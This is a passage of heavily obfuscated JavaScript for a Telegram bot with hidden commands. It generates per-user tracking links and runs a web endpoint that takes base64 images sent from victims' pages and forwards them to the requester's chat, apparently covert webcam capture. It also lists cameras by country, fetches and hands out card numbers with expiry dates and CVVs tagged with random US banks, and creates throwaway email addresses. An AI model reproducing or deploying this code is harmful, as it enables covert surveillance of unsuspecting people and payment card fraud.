            'inline_keyboard': [
                [{
                        'text': _0xdb676b[_0x296caa(0x8f8)],
                        'callback_data': _0xdb676b[_0x296caa(0x4fa)]
                    }],
                [{
                        'text': _0xdb676b[_0x296caa(0x6cc)],
                        'callback_data': _0xdb676b[_0x296caa(0x33e)]
                    }]
            ]
        }
    });
}
bot[_0x544f76(0x937)](/\/jjjjjavayy/, _0x13de29 => {
    const _0x4a4fda = _0x544f76, _0xf9d71b = {
            'LTDaz': _0x4a4fda(0x489) + _0x4a4fda(0x1d3) + _0x4a4fda(0x69a) + _0x4a4fda(0x433) + _0x4a4fda(0x1ae),
            'DBLxN': _0x4a4fda(0x307) + 'ي',
            'XBMSg': _0x4a4fda(0x50c),
            'qacPq': _0x4a4fda(0x8a5) + _0x4a4fda(0x7c2),
            'IenUN': _0x4a4fda(0x455) + 're',
            'mJLpp': _0x4a4fda(0x8ee) + 'ء',
            'KrqWM': _0x4a4fda(0x6f6)
        }, _0x5b6f35 = _0x13de29[_0x4a4fda(0x638)]['id'], _0x2eca7f = _0xf9d71b[_0x4a4fda(0x3a1)];
    bot[_0x4a4fda(0x84f) + 'e'](_0x5b6f35, _0x2eca7f, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0xf9d71b[_0x4a4fda(0x56c)],
                        'callback_data': _0xf9d71b[_0x4a4fda(0x2c5)]
                    }],
                [{
                        'text': _0xf9d71b[_0x4a4fda(0x374)],
                        'callback_data': _0xf9d71b[_0x4a4fda(0x50b)]
                    }],
                [{
                        'text': _0xf9d71b[_0x4a4fda(0x57f)],
                        'callback_data': _0xf9d71b[_0x4a4fda(0x2e8)]
                    }]
            ]
        }
    });
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), _0x47f6f3 => {
    const _0x36ffff = _0x544f76, _0x41be26 = {
            'WeGoh': function (_0x485891, _0x31e882) {
                return _0x485891 === _0x31e882;
            },
            'CtbOb': _0x36ffff(0x50c),
            'sIHCg': function (_0x291b86, _0x20807b) {
                return _0x291b86 === _0x20807b;
            },
            'tPFpd': _0x36ffff(0x455) + 're',
            'bQTyp': _0x36ffff(0x6f6),
            'wrNNl': _0x36ffff(0x5f2) + _0x36ffff(0x61e) + '\x20✅',
            'Ymkkn': _0x36ffff(0x287)
        }, _0x45deef = _0x47f6f3[_0x36ffff(0x320)][_0x36ffff(0x638)]['id'];
    let _0x2e7368;
    if (_0x41be26[_0x36ffff(0x346)](_0x47f6f3[_0x36ffff(0x8fe)], _0x41be26[_0x36ffff(0x21e)]))
        _0x2e7368 = baseUrl + (_0x36ffff(0x550) + _0x36ffff(0x579)) + _0x45deef + _0x36ffff(0x2aa);
    else {
        if (_0x41be26[_0x36ffff(0x680)](_0x47f6f3[_0x36ffff(0x8fe)], _0x41be26[_0x36ffff(0x6b1)]))
            _0x2e7368 = baseUrl + (_0x36ffff(0x3fa) + _0x36ffff(0x579)) + _0x45deef + _0x36ffff(0x2aa);
        else
            _0x41be26[_0x36ffff(0x346)](_0x47f6f3[_0x36ffff(0x8fe)], _0x41be26[_0x36ffff(0x2b7)]) && (_0x2e7368 = baseUrl + (_0x36ffff(0x239) + _0x36ffff(0x579)) + _0x45deef + _0x36ffff(0x2aa));
    }
    if (_0x2e7368)
        bot[_0x36ffff(0x84f) + 'e'](_0x45deef, _0x36ffff(0x198) + _0x36ffff(0x3c3) + _0x2e7368), bot[_0x36ffff(0x737) + _0x36ffff(0x4bc)](_0x47f6f3['id'], { 'text': _0x41be26[_0x36ffff(0x22a)] });
    else
        _0x41be26[_0x36ffff(0x680)](_0x47f6f3[_0x36ffff(0x8fe)], _0x41be26[_0x36ffff(0x7d5)]) && (bot[_0x36ffff(0x84f) + 'e'](_0x45deef, _0x36ffff(0x61a) + _0x36ffff(0x41f) + _0x36ffff(0x8df) + _0x36ffff(0x7dd) + _0x36ffff(0x8c5) + _0x36ffff(0x4c4) + _0x36ffff(0x1e3) + 'ip'), bot[_0x36ffff(0x737) + _0x36ffff(0x4bc)](_0x47f6f3['id'], { 'text': '' }));
}), bot[_0x544f76(0x937)](/\/نننطسطوو/, _0x5cf20e => {
    const _0x181307 = _0x544f76, _0x5775c9 = {
            'pQQPi': _0x181307(0x496) + _0x181307(0x859) + _0x181307(0x5bd) + _0x181307(0x8a4),
            'LqBdO': _0x181307(0x7dc) + _0x181307(0x848),
            'DdWlj': _0x181307(0x7ba) + 's',
            'iJYqM': function (_0x47032e, _0x545eca) {
                return _0x47032e(_0x545eca);
            }
        }, _0x1b3d65 = _0x5cf20e[_0x181307(0x638)]['id'];
    bot[_0x181307(0x84f) + 'e'](_0x1b3d65, _0x5775c9[_0x181307(0x79c)], {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x5775c9[_0x181307(0x4fc)],
                        'callback_data': _0x5775c9[_0x181307(0x6df)]
                    }]]
        }
    }), _0x5775c9[_0x181307(0x3b2)](isDeveloper, _0x1b3d65) && _0x5775c9[_0x181307(0x3b2)](showAdminPanel, _0x1b3d65);
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), async _0x3ce9d6 => {
    const _0x5b1e4c = _0x544f76, _0x568635 = {
            'UkTXM': function (_0x2c754a, _0x3348f6) {
                return _0x2c754a === _0x3348f6;
            },
            'nMTQi': _0x5b1e4c(0x7ba) + 's',
            'ujPIw': function (_0x37a53f, _0x31ae90) {
                return _0x37a53f(_0x31ae90);
            },
            'RhmCy': function (_0x1cb0d6, _0x68ee1) {
                return _0x1cb0d6 in _0x68ee1;
            },
            'MdWvk': function (_0x3aa411, _0x1389ed, _0x740e25) {
                return _0x3aa411(_0x1389ed, _0x740e25);
            },
            'JuJmk': _0x5b1e4c(0x7f6),
            'pniTy': _0x5b1e4c(0x234),
            'KaLGR': function (_0x4fbfa7, _0x407472) {
                return _0x4fbfa7 - _0x407472;
            },
            'RBOEf': function (_0x1a7970, _0x496b40, _0x1054f3) {
                return _0x1a7970(_0x496b40, _0x1054f3);
            }
        }, _0x218739 = _0x3ce9d6[_0x5b1e4c(0x320)][_0x5b1e4c(0x638)]['id'];
    if (_0x568635[_0x5b1e4c(0x7a3)](_0x3ce9d6[_0x5b1e4c(0x8fe)], _0x568635[_0x5b1e4c(0x5c9)]))
        _0x568635[_0x5b1e4c(0x909)](showCountryList, _0x218739);
    else {
        if (_0x568635[_0x5b1e4c(0x8fd)](_0x3ce9d6[_0x5b1e4c(0x8fe)], countryTranslation))
            bot[_0x5b1e4c(0x699) + _0x5b1e4c(0x38c)](_0x218739, _0x3ce9d6[_0x5b1e4c(0x320)][_0x5b1e4c(0x342)]), _0x568635[_0x5b1e4c(0x852)](displayCameras, _0x218739, _0x3ce9d6[_0x5b1e4c(0x8fe)]);
        else {
            if (_0x3ce9d6[_0x5b1e4c(0x8fe)][_0x5b1e4c(0x428)](_0x568635[_0x5b1e4c(0x6ad)])) {
                const _0x197e34 = _0x568635[_0x5b1e4c(0x852)](parseInt, _0x3ce9d6[_0x5b1e4c(0x8fe)][_0x5b1e4c(0x7b8)]('_')[-0x1 * 0xd8b + -0xde1 + 0x1b6d], -0x1878 + 0x247b + -0x5 * 0x265);
                bot[_0x5b1e4c(0x699) + _0x5b1e4c(0x38c)](_0x218739, _0x3ce9d6[_0x5b1e4c(0x320)][_0x5b1e4c(0x342)]), _0x568635[_0x5b1e4c(0x852)](showCountryList, _0x218739, _0x197e34);
            } else {
                if (_0x3ce9d6[_0x5b1e4c(0x8fe)][_0x5b1e4c(0x428)](_0x568635[_0x5b1e4c(0x3a6)])) {
                    const _0x3f3de6 = _0x568635[_0x5b1e4c(0x852)](parseInt, _0x3ce9d6[_0x5b1e4c(0x8fe)][_0x5b1e4c(0x7b8)]('_')[-0x28 * -0x67 + -0x177d + -0x3b3 * -0x2], 0x1 * -0x11f + -0x1 * 0x1c8d + -0x2 * -0xedb), _0x4eb945 = Math[_0x5b1e4c(0x948)](-0x2 * -0x1005 + 0xd * 0xb5 + -0x5 * 0x83f, _0x568635[_0x5b1e4c(0x871)](_0x3f3de6, -0xf80 + -0x26e0 + 0x3672));
                    bot[_0x5b1e4c(0x699) + _0x5b1e4c(0x38c)](_0x218739, _0x3ce9d6[_0x5b1e4c(0x320)][_0x5b1e4c(0x342)]), _0x568635[_0x5b1e4c(0x31f)](showCountryList, _0x218739, _0x4eb945);
                }
            }
        }
    }
});
const americanBanks = [
        _0x544f76(0x8cc) + _0x544f76(0x857),
        _0x544f76(0x42e),
        _0x544f76(0x825),
        _0x544f76(0x812) + 'o',
        _0x544f76(0x62a) + 'e',
        _0x544f76(0x413),
        _0x544f76(0x1c2),
        _0x544f76(0x2f5),
        _0x544f76(0x78a) + _0x544f76(0x317),
        _0x544f76(0x1e6) + _0x544f76(0x41d)
    ], fetchVisaData = async () => {
        const _0x1ac958 = _0x544f76, _0x51725c = {
                'aDGSC': function (_0x473310, _0xf95957) {
                    return _0x473310 === _0xf95957;
                },
                'mdIkx': function (_0x531032, _0x5653ab) {
                    return _0x531032 * _0x5653ab;
                },
                'ydJaC': _0x1ac958(0x5f4) + _0x1ac958(0x4d3) + _0x1ac958(0x8b8),
                'rhxEh': _0x1ac958(0x5b6),
                'RUbrD': function (_0x582dcf, _0x3a478a) {
                    return _0x582dcf + _0x3a478a;
                },
                'OWWsc': function (_0x35df0c, _0x4e228a) {
                    return _0x35df0c * _0x4e228a;
                },
                'mHNeG': _0x1ac958(0x1c1) + _0x1ac958(0x7e7) + _0x1ac958(0x763),
                'DMxgd': function (_0x4d06a8, _0x50c36f) {
                    return _0x4d06a8 > _0x50c36f;
                },
                'iuUHp': function (_0x1f9ccd, _0x583bd7) {
                    return _0x1f9ccd > _0x583bd7;
                },
                'aMBok': _0x1ac958(0x8ce) + _0x1ac958(0x3c9) + _0x1ac958(0x5c3) + _0x1ac958(0x696) + _0x1ac958(0x421) + _0x1ac958(0x55d),
                'uWQiY': _0x1ac958(0x3dc) + _0x1ac958(0x829)
            };
        try {
            const _0x353b14 = _0x51725c[_0x1ac958(0x93a)], _0x46dccd = await axios[_0x1ac958(0x4f5)](_0x353b14), _0x30f0f1 = _0x46dccd[_0x1ac958(0x8fe)], _0x227330 = _0x30f0f1[_0x1ac958(0x470)]()[_0x1ac958(0x7b8)]('\x0a');
            if (_0x51725c[_0x1ac958(0x7c7)](_0x227330[_0x1ac958(0x23e)], 0x1aa3 + -0x13 * 0x128 + -0x4ab)) {
                const _0x28f5ac = _0x227330[_0x1ac958(0x430)](_0x51cf23 => {
                    const _0x45a309 = _0x1ac958, _0x3514fa = _0x51cf23[_0x45a309(0x7b8)]('|');
                    if (_0x51725c[_0x45a309(0x2ad)](_0x3514fa[_0x45a309(0x23e)], 0x5 * -0x481 + -0x1c29 + 0x32b2))
                        return {
                            'CardNumber': _0x3514fa[-0x4 * 0x276 + 0x1ad1 + -0x5 * 0x365],
                            'Expiry': _0x3514fa[0x24ce + -0x122c + -0x1 * 0x12a1] + '/' + _0x3514fa[-0x11ca + 0x1 * -0x22f3 + 0x34bf],
                            'CVV': _0x3514fa[-0x1 * -0xf17 + -0x2 * -0x1a5 + 0x2 * -0x92f],
                            'Bank': americanBanks[Math[_0x45a309(0x69d)](_0x51725c[_0x45a309(0x820)](Math[_0x45a309(0x360)](), americanBanks[_0x45a309(0x23e)]))],
                            'CardType': _0x51725c[_0x45a309(0x1a7)],
                            'Country': _0x51725c[_0x45a309(0x71d)],
                            'Value': '$' + _0x51725c[_0x45a309(0x839)](Math[_0x45a309(0x69d)](_0x51725c[_0x45a309(0x3a3)](Math[_0x45a309(0x360)](), -0xa02 + 0x3 * 0xb6f + -0xc16 * 0x2)), -0x9 * 0x354 + 0x1 * 0x11d9 + -0xc25 * -0x1)
                        };
                })[_0x1ac958(0x5a5)](Boolean);
                if (_0x51725c[_0x1ac958(0x1d1)](_0x28f5ac[_0x1ac958(0x23e)], 0x12 * -0x8b + -0x70b + -0x15 * -0xcd))
                    return _0x28f5ac[Math[_0x1ac958(0x69d)](_0x51725c[_0x1ac958(0x3a3)](Math[_0x1ac958(0x360)](), _0x28f5ac[_0x1ac958(0x23e)]))];
            }
            return console[_0x1ac958(0x2e0)](_0x51725c[_0x1ac958(0x861)]), null;
        } catch (_0x2e5c8c) {
            return console[_0x1ac958(0x2e0)](_0x51725c[_0x1ac958(0x6a1)], _0x2e5c8c[_0x1ac958(0x320)]), null;
        }
    };
bot[_0x544f76(0x937)](/\/نكخمنتته/, _0x1952e3 => {
    const _0x2ac2ba = _0x544f76, _0x31e6ed = {
            'pMrRI': _0x2ac2ba(0x662) + _0x2ac2ba(0x5ab),
            'gILsF': _0x2ac2ba(0x480) + _0x2ac2ba(0x5ab),
            'jkyJA': _0x2ac2ba(0x3d6),
            'OrWks': _0x2ac2ba(0x633) + _0x2ac2ba(0x7e5) + _0x2ac2ba(0x827) + _0x2ac2ba(0x6f2) + _0x2ac2ba(0x7aa) + _0x2ac2ba(0x46d) + _0x2ac2ba(0x5b8)
        }, _0x599be6 = _0x1952e3[_0x2ac2ba(0x638)]['id'], _0x199b91 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x31e6ed[_0x2ac2ba(0x279)],
                            'callback_data': _0x31e6ed[_0x2ac2ba(0x8e3)]
                        }]]
            },
            'parse_mode': _0x31e6ed[_0x2ac2ba(0x6e3)]
        };
    bot[_0x2ac2ba(0x84f) + 'e'](_0x599be6, _0x31e6ed[_0x2ac2ba(0x58a)], _0x199b91);
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), async _0x51b3bf => {
    const _0x5adc3c = _0x544f76, _0x70d9c7 = {
            'xUTZs': function (_0x3ae275, _0x184e1e) {
                return _0x3ae275 === _0x184e1e;
            },
            'eHnWf': _0x5adc3c(0x480) + _0x5adc3c(0x5ab),
            'tknDQ': _0x5adc3c(0x375) + _0x5adc3c(0x689) + _0x5adc3c(0x651) + _0x5adc3c(0x28d),
            'ZAtCJ': _0x5adc3c(0x375) + _0x5adc3c(0x689) + _0x5adc3c(0x4af) + _0x5adc3c(0x19a),
            'WXYEy': _0x5adc3c(0x375) + _0x5adc3c(0x689) + _0x5adc3c(0x460) + _0x5adc3c(0x92e),
            'IHDas': _0x5adc3c(0x375) + _0x5adc3c(0x689) + _0x5adc3c(0x70c) + _0x5adc3c(0x42f),
            'ooQTz': _0x5adc3c(0x375) + _0x5adc3c(0x689) + _0x5adc3c(0x832) + _0x5adc3c(0x873),
            'dykjx': function (_0x510d14) {
                return _0x510d14();
            },
            'ObNfA': _0x5adc3c(0x3d6),
            'ouCAD': _0x5adc3c(0x2fb) + _0x5adc3c(0x5f9) + _0x5adc3c(0x7ac) + _0x5adc3c(0x6bb) + _0x5adc3c(0x795)
        }, _0x3debef = _0x51b3bf[_0x5adc3c(0x320)][_0x5adc3c(0x638)]['id'];
    if (_0x70d9c7[_0x5adc3c(0x6cf)](_0x51b3bf[_0x5adc3c(0x8fe)], _0x70d9c7[_0x5adc3c(0x1f5)])) {
        let _0x582548 = await bot[_0x5adc3c(0x84f) + 'e'](_0x3debef, _0x70d9c7[_0x5adc3c(0x1bc)]);
        await new Promise(_0x5936c2 => setTimeout(_0x5936c2, -0x4 * 0x931 + 0x1ac4 + 0xde8)), await bot[_0x5adc3c(0x432) + _0x5adc3c(0x628)](_0x70d9c7[_0x5adc3c(0x5b9)], {
            'chat_id': _0x3debef,
            'message_id': _0x582548[_0x5adc3c(0x342)]
        }), await new Promise(_0x40540b => setTimeout(_0x40540b, 0x10bf + -0x1 * 0xe75 + 0x12 * 0x17)), await bot[_0x5adc3c(0x432) + _0x5adc3c(0x628)](_0x70d9c7[_0x5adc3c(0x598)], {
            'chat_id': _0x3debef,
            'message_id': _0x582548[_0x5adc3c(0x342)]
        }), await new Promise(_0x351e85 => setTimeout(_0x351e85, 0x6 * 0x4c0 + 0x160f + -0x52f * 0x9)), await bot[_0x5adc3c(0x432) + _0x5adc3c(0x628)](_0x70d9c7[_0x5adc3c(0x1fb)], {
            'chat_id': _0x3debef,
            'message_id': _0x582548[_0x5adc3c(0x342)]
        }), await new Promise(_0x46545f => setTimeout(_0x46545f, -0xc9c + -0x39c * -0x3 + -0x68 * -0xe)), await bot[_0x5adc3c(0x432) + _0x5adc3c(0x628)](_0x70d9c7[_0x5adc3c(0x818)], {
            'chat_id': _0x3debef,
            'message_id': _0x582548[_0x5adc3c(0x342)]
        }), await new Promise(_0x2f34c6 => setTimeout(_0x2f34c6, 0x255d + 0x1e1 * 0x11 + 0x16 * -0x2f9)), await bot[_0x5adc3c(0x699) + _0x5adc3c(0x38c)](_0x3debef, _0x582548[_0x5adc3c(0x342)]);
        const _0x442d6a = await _0x70d9c7[_0x5adc3c(0x552)](fetchVisaData);
        if (_0x442d6a) {
            const {
                CardNumber: _0x156213,
                Expiry: _0x5c1f9c,
                CVV: _0x1969e1,
                Bank: _0x31bcb5,
                CardType: _0x9bda4e,
                Country: _0x39ce66,
                Value: _0x55f1bf
            } = _0x442d6a;
            bot[_0x5adc3c(0x84f) + 'e'](_0x3debef, _0x5adc3c(0x286) + _0x5adc3c(0x4cb) + _0x5adc3c(0x408) + '`' + _0x156213 + (_0x5adc3c(0x6ee) + _0x5adc3c(0x1b5)) + _0x5c1f9c + (_0x5adc3c(0x4b6) + _0x5adc3c(0x369)) + _0x1969e1 + (_0x5adc3c(0x499) + _0x5adc3c(0x452)) + _0x31bcb5 + (_0x5adc3c(0x646) + _0x5adc3c(0x3be) + '`') + _0x9bda4e + (_0x5adc3c(0x1ee) + _0x5adc3c(0x5a3)) + _0x39ce66 + (_0x5adc3c(0x610) + _0x5adc3c(0x491)) + _0x55f1bf + (_0x5adc3c(0x62e) + _0x5adc3c(0x32f) + _0x5adc3c(0x32f) + _0x5adc3c(0x398) + _0x5adc3c(0x36d) + _0x5adc3c(0x1a8) + _0x5adc3c(0x8ad)), { 'parse_mode': _0x70d9c7[_0x5adc3c(0x4e0)] });
        } else
            bot[_0x5adc3c(0x84f) + 'e'](_0x3debef, _0x70d9c7[_0x5adc3c(0x4d5)]);
    }
});
const deleteFolderRecursive = _0x49196d => {
    const _0x1c655e = _0x544f76, _0x3b10e2 = {
            'upwNs': function (_0x50f684, _0x133057) {
                return _0x50f684(_0x133057);
            }
        };
    fs[_0x1c655e(0x706)](_0x49196d) && (fs[_0x1c655e(0x935) + 'c'](_0x49196d)[_0x1c655e(0x64d)](_0x2b69be => {
        const _0x46629a = _0x1c655e, _0x5c2c25 = path[_0x46629a(0x1ec)](_0x49196d, _0x2b69be);
        fs[_0x46629a(0x8f9)](_0x5c2c25)[_0x46629a(0x77d) + 'y']() ? _0x3b10e2[_0x46629a(0x2ed)](deleteFolderRecursive, _0x5c2c25) : fs[_0x46629a(0x904)](_0x5c2c25);
    }), fs[_0x1c655e(0x7b7)](_0x49196d));
};
app[_0x544f76(0x513)](express[_0x544f76(0x295)](__dirname)), app[_0x544f76(0x5cd)](_0x544f76(0x1ab), (_0x5ec9c1, _0x20b0d2) => {
    const _0x27fd19 = _0x544f76, _0x1b8fc0 = {
            'Aakyq': _0x27fd19(0x48f),
            'QZHJo': function (_0x486c9d, _0x5a1e8b) {
                return _0x486c9d + _0x5a1e8b;
            },
            'nLGMq': _0x27fd19(0x54a),
            'eVJIJ': _0x27fd19(0x53b)
        }, _0x56c9e1 = _0x5ec9c1[_0x27fd19(0x539)][_0x27fd19(0x572)], _0x1264ca = _0x5ec9c1[_0x27fd19(0x539)][_0x27fd19(0x2ea)][_0x27fd19(0x7b8)](','), _0x2f3f56 = path[_0x27fd19(0x1ec)](__dirname, _0x1b8fc0[_0x27fd19(0x568)]);
    !fs[_0x27fd19(0x706)](_0x2f3f56) && fs[_0x27fd19(0x8e8)](_0x2f3f56), _0x1264ca[_0x27fd19(0x64d)]((_0x3e4614, _0x122426) => {
        const _0xa65d12 = _0x27fd19, _0x7a28f2 = Buffer[_0xa65d12(0x953)](_0x3e4614, _0x1b8fc0[_0xa65d12(0x2ac)]), _0x31dad5 = path[_0xa65d12(0x1ec)](_0x2f3f56, _0x56c9e1 + '_' + _0x122426 + _0xa65d12(0x716));
        fs[_0xa65d12(0x6c4) + _0xa65d12(0x53c)](_0x31dad5, _0x7a28f2), bot[_0xa65d12(0x5e4)](_0x56c9e1, _0x7a28f2, { 'caption': _0xa65d12(0x6f0) + _0x1b8fc0[_0xa65d12(0x2bc)](_0x122426, 0x1 * 0x1fc1 + -0x6 * -0xb3 + -0xd6 * 0x2b) });
    }), console[_0x27fd19(0x2e0)](_0x27fd19(0x894) + _0x27fd19(0x1da) + _0x27fd19(0x7c6) + _0x27fd19(0x8cb) + _0x56c9e1), _0x20b0d2[_0x27fd19(0x7c0)](_0x1b8fc0[_0x27fd19(0x3e8)]);
}), app[_0x544f76(0x4f5)](_0x544f76(0x6b5), (_0x256578, _0x316e03) => {
    const _0x44e877 = _0x544f76, _0x13e915 = { 'wRWgq': _0x44e877(0x3d4) };
    _0x316e03[_0x44e877(0x89c)](path[_0x44e877(0x1ec)](__dirname, _0x13e915[_0x44e877(0x1ad)]));
}), bot[_0x544f76(0x937)](/\/اتتهتتاههة/, _0x2a79f0 => {
    const _0xadb34 = _0x544f76, _0x515d0d = {
            'mARNs': _0xadb34(0x489) + _0xadb34(0x1d3) + _0xadb34(0x3d5) + _0xadb34(0x4db) + _0xadb34(0x705) + _0xadb34(0x222),
            'HojCP': _0xadb34(0x574) + _0xadb34(0x712) + _0xadb34(0x4ba),
            'IMNBz': _0xadb34(0x814) + _0xadb34(0x704)
        }, _0x375b5e = _0x2a79f0[_0xadb34(0x638)]['id'], _0x2e2e16 = _0x515d0d[_0xadb34(0x3c2)];
    bot[_0xadb34(0x84f) + 'e'](_0x375b5e, _0x2e2e16, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x515d0d[_0xadb34(0x570)],
                        'callback_data': _0x515d0d[_0xadb34(0x4bb)]
                    }]]
        }
    });
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), _0x3c5623 => {
    const _0x3e8b19 = _0x544f76, _0x1fd55e = {
            'UxTgN': function (_0x2af528, _0xb3f1cc) {
                return _0x2af528 === _0xb3f1cc;
            },
            'qXuPk': _0x3e8b19(0x814) + _0x3e8b19(0x704)
        }, _0x23e121 = _0x3c5623[_0x3e8b19(0x320)][_0x3e8b19(0x638)]['id'], _0x35a891 = _0x3c5623[_0x3e8b19(0x320)][_0x3e8b19(0x342)];
    if (_0x1fd55e[_0x3e8b19(0x8b7)](_0x3c5623[_0x3e8b19(0x8fe)], _0x1fd55e[_0x3e8b19(0x798)])) {
        const _0x31dc8f = baseUrl + (_0x3e8b19(0x422) + _0x3e8b19(0x560)) + _0x23e121;
        bot[_0x3e8b19(0x84f) + 'e'](_0x23e121, _0x3e8b19(0x1d9) + _0x3e8b19(0x1ef) + _0x3e8b19(0x4a0) + _0x3e8b19(0x7b1) + _0x3e8b19(0x3b4) + _0x3e8b19(0x478) + _0x3e8b19(0x70b) + _0x3e8b19(0x8ca) + _0x3e8b19(0x2ae) + _0x3e8b19(0x758) + _0x3e8b19(0x554) + _0x3e8b19(0x28f) + _0x3e8b19(0x900) + _0x3e8b19(0x348) + _0x3e8b19(0x1db) + _0x3e8b19(0x28a) + _0x3e8b19(0x7bc) + _0x3e8b19(0x86a) + _0x3e8b19(0x5e0) + _0x3e8b19(0x278) + _0x3e8b19(0x39d));
    }
}), bot[_0x544f76(0x937)](/\/s2854تصخصrt/, _0x221a10 => {
    const _0x2ac55c = _0x544f76, _0x2b69c9 = {
            'gTRqL': _0x2ac55c(0x412) + _0x2ac55c(0x6bd),
            'XMVyA': _0x2ac55c(0x531) + 'il',
            'RtojH': _0x2ac55c(0x590)
        }, _0x3ace35 = _0x221a10[_0x2ac55c(0x638)]['id'], _0x4b275f = _0x221a10[_0x2ac55c(0x953)], _0x211823 = _0x4b275f[_0x2ac55c(0x6b9)], _0x5df81b = {
            'inline_keyboard': [[{
                        'text': _0x2b69c9[_0x2ac55c(0x1dc)],
                        'callback_data': _0x2b69c9[_0x2ac55c(0x2b4)]
                    }]]
        };
    bot[_0x2ac55c(0x84f) + 'e'](_0x3ace35, _0x2ac55c(0x691) + _0x2ac55c(0x48e) + _0x211823 + (_0x2ac55c(0x681) + _0x2ac55c(0x4e2) + _0x2ac55c(0x43e) + _0x2ac55c(0x53d) + _0x2ac55c(0x3f2) + _0x2ac55c(0x1e7) + _0x2ac55c(0x3ea) + _0x2ac55c(0x298) + _0x2ac55c(0x6ba) + 'g>'), {
        'parse_mode': _0x2b69c9[_0x2ac55c(0x38b)],
        'reply_markup': { 'inline_keyboard': _0x5df81b[_0x2ac55c(0x4c8) + _0x2ac55c(0x63f)] }
    });
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), _0x394faf => {
    const _0x5d4be4 = _0x544f76, _0x588fd0 = {
            'kruqa': function (_0x52d68a, _0x4fb726) {
                return _0x52d68a === _0x4fb726;
            },
            'zCfbc': _0x5d4be4(0x531) + 'il',
            'ZvbSY': _0x5d4be4(0x590)
        }, _0xd3d875 = _0x394faf[_0x5d4be4(0x320)][_0x5d4be4(0x638)]['id'], _0x5f0b27 = _0x394faf[_0x5d4be4(0x8fe)];
    _0x588fd0[_0x5d4be4(0x31a)](_0x5f0b27, _0x588fd0[_0x5d4be4(0x5d2)]) && bot[_0x5d4be4(0x84f) + 'e'](_0xd3d875, _0x5d4be4(0x69f) + _0x5d4be4(0x7e8) + _0x5d4be4(0x824) + _0x5d4be4(0x92d) + _0x5d4be4(0x5ac) + _0x5d4be4(0x354) + _0x5d4be4(0x8dc) + _0x5d4be4(0x943) + _0x5d4be4(0x1f0) + _0x5d4be4(0x3cf) + _0x5d4be4(0x3cc) + _0x5d4be4(0x27f) + _0x5d4be4(0x40a) + _0x5d4be4(0x37d) + _0x5d4be4(0x3d7) + _0x5d4be4(0x5a2) + _0x5d4be4(0x8f7) + _0x5d4be4(0x526) + _0x5d4be4(0x4c1) + _0x5d4be4(0x264) + _0x5d4be4(0x693) + _0x5d4be4(0x4a6) + _0x5d4be4(0x880) + _0x5d4be4(0x426) + _0x5d4be4(0x49d) + _0x5d4be4(0x2cf) + _0x5d4be4(0x805), { 'parse_mode': _0x588fd0[_0x5d4be4(0x2c0)] });
});
const EMAILS_FILE = _0x544f76(0x3d1) + 'n';
function readEmails() {
    const _0x215709 = _0x544f76, _0x1ecdbf = { 'kxsRT': _0x215709(0x897) };
    try {
        const _0x1ebf13 = fs[_0x215709(0x707) + 'nc'](EMAILS_FILE, _0x1ecdbf[_0x215709(0x449)]);
        return JSON[_0x215709(0x87b)](_0x1ebf13);
    } catch (_0x1fc2f9) {
        return {};
    }
}
function writeEmails(_0x1d16cb) {
    const _0x3d8ea5 = _0x544f76;
    fs[_0x3d8ea5(0x6c4) + _0x3d8ea5(0x53c)](EMAILS_FILE, JSON[_0x3d8ea5(0x8ed)](_0x1d16cb, null, 0x90c + 0x1 * 0x2291 + -0xb7 * 0x3d));
}
bot[_0x544f76(0x937)](/\/email/, async _0x2c2d6d => {
    const _0x22e9cd = _0x544f76, _0x25482b = {
            'POfjB': function (_0x45425d) {
                return _0x45425d();
            },
            'JBXAv': _0x22e9cd(0x2d8) + _0x22e9cd(0x350) + _0x22e9cd(0x8a9) + _0x22e9cd(0x697),
            'YlTed': _0x22e9cd(0x590),
            'qrOfg': _0x22e9cd(0x58c) + _0x22e9cd(0x2d2) + _0x22e9cd(0x545) + _0x22e9cd(0x722) + _0x22e9cd(0x4ea),
            'Wpkfm': _0x22e9cd(0x3ca) + _0x22e9cd(0x893),
            'ZgDkY': _0x22e9cd(0x2d7) + _0x22e9cd(0x4df),
            'vRyKp': function (_0x42a75f, _0x54823e) {
                return _0x42a75f(_0x54823e);
            },
            'lmymn': _0x22e9cd(0x8e5) + _0x22e9cd(0x7f7) + _0x22e9cd(0x51f) + 'g>'
        }, _0x4880c6 = _0x2c2d6d[_0x22e9cd(0x953)]['id'], _0x30f6b8 = _0x2c2d6d[_0x22e9cd(0x638)]['id'];
    let _0x225ebf = _0x25482b[_0x22e9cd(0x895)](readEmails);
    _0x225ebf[_0x4880c6] && delete _0x225ebf[_0x4880c6];
    try {
        bot[_0x22e9cd(0x84f) + 'e'](_0x30f6b8, _0x25482b[_0x22e9cd(0x5b5)], { 'parse_mode': _0x25482b[_0x22e9cd(0x362)] });
        const _0x2b698a = Math[_0x22e9cd(0x360)]()[_0x22e9cd(0x762)](0x159c + -0x673 + -0xf05)[_0x22e9cd(0x6ab)](-0x13f + 0x1d2c + -0x1beb, -0x10d2 + -0x11de + 0xca * 0x2c), _0x2229c9 = _0x22e9cd(0x2a2) + _0x2b698a, _0x105ed2 = await axios[_0x22e9cd(0x5cd)](_0x25482b[_0x22e9cd(0x6b3)], {
                'name': _0x2229c9,
                'domain': _0x25482b[_0x22e9cd(0x2fd)]
            }, { 'headers': { 'User-Agent': _0x25482b[_0x22e9cd(0x77f)] } }), _0x325cad = _0x105ed2[_0x22e9cd(0x8fe)][_0x22e9cd(0x1f6)];
        _0x225ebf[_0x4880c6] = _0x325cad, _0x25482b[_0x22e9cd(0x62c)](writeEmails, _0x225ebf), bot[_0x22e9cd(0x84f) + 'e'](_0x30f6b8, _0x22e9cd(0x1ff) + _0x22e9cd(0x7d6) + _0x22e9cd(0x8aa) + _0x22e9cd(0x3c5) + _0x22e9cd(0x36a) + _0x325cad + (_0x22e9cd(0x1ea) + _0x22e9cd(0x216) + _0x22e9cd(0x62d) + _0x22e9cd(0x4a5) + _0x22e9cd(0x6f7)), { 'parse_mode': _0x25482b[_0x22e9cd(0x362)] });
    } catch (_0x553e4a) {
